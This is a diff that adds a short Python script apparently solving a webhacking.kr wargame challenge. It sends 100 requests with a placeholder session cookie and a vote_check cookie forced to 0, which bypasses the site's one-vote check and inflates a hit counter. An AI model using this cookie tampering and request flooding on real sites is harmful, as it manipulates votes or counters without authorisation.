@@ -1,0 +1,7 @@
+import requests
+
+for i in range(100):
+    url = 'https://webhacking.kr/challenge/code-5/?hit=사용자이름 '
+    cookie = {'PHPSESSID':'세션값', 'vote_check':'0'}
+    requests.get(url, cookies=cookie)
+    print(i)
